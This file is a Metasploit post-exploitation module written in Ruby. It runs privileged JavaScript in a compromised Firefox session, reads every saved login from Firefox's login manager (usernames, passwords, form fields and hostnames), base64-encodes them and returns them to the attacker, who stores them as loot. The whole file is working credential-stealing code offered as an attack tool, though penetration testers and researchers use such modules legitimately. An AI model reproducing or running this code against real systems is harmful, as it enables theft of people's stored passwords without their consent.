##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'msf/core'
require 'msf/core/payload/firefox'

class Metasploit3 < Msf::Post

  include Msf::Payload::Firefox
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox Gather Passwords from Privileged Javascript Shell',
      'Description'   => %q{
        This module allows collection of passwords from a Firefox Privileged Javascript Shell.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'DisclosureDate' => 'Apr 11 2014'
    ))

    register_options([
      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
    ], self.class)
  end

  def run
    print_status "Running the privileged javascript..."
    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])
    if results.present?
      begin
        passwords = JSON.parse(results)
        passwords.each do |entry|
          entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
        end

        file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
        print_good("Saved #{passwords.length} passwords to #{file}")
      rescue JSON::ParserError => e
        print_warning(results)
      end
    end
  end

  def js_payload
    %Q|
      (function(send){
        try {
          var manager = Components
                          .classes["@mozilla.org/login-manager;1"]
                          .getService(Components.interfaces.nsILoginManager);
          var logins = manager.getAllLogins();
          var passwords = [];
          var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
          var fields = ['password', 'passwordField', 'username', 'usernameField',
                        'httpRealm', 'formSubmitURL', 'hostname'];

          var sanitize = function(passwdObj) {
            var sanitized = { };
            for (var i in fields) {
              sanitized[fields[i]] = b64(passwdObj[fields[i]]);
            }
            return sanitized;
          }

          // Find user from returned array of nsILoginInfo objects
          for (var i = 0; i < logins.length; i++) {
            passwords.push(sanitize(logins[i]));
          }

          send(JSON.stringify(passwords));
        } catch (e) {
          send(e);
        }
      })(send);
    |.strip
  end
end
